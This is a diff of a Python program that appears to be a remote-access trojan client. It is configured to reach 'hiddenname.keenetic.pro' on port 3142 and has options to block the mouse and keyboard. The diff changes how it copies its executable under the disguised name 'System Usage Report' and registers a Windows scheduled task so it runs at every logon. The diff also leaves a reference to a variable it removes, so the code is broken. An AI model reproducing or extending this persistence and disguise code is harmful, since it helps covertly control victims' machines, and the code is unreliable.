@@ -16,7 +16,8 @@ timeout = 60
 host = 'hiddenname.keenetic.pro'
 port = 3142
 
-app_name = 'System Usage Report'
+app_name_origin = 'System-Usage-Report'
+app_name_destination = 'System Usage Report'
 
 mouse_blocking = False
 keyboard_blocking = False
@@ -79,15 +80,15 @@ def get_working_dir():
 
 
 def create_startup_task(working_dir):
-    if not (app_name in run_cmd_command(fr'SCHTASKS /Query /TN "{app_name}"')):
-        run_cmd_command(fr'SCHTASKS /CREATE /SC ONLOGON /TN "{app_name}" /TR "{working_dir}"')
+    if not (app_name in run_cmd_command(fr'SCHTASKS /Query /TN "{app_name_destination}"')):
+        run_cmd_command(fr'SCHTASKS /CREATE /SC ONLOGON /TN "{app_name_destination}" /TR "{working_dir}"')
 
 
 def add_to_startup():
-    working_dir = get_working_dir() + f'\\{app_name}' + '.exe'
+    working_dir = get_working_dir() + f'\\{app_name_destination}' + '.exe'
 
     if not os.path.isfile(working_dir):
-        copyfile(os.getcwd() + f'\\{app_name}' + '.exe', working_dir)
+        copyfile(os.getcwd() + f'\\{app_name_origin}' + '.exe', working_dir)
         create_startup_task(working_dir)
         print('Program was added to startup')
 
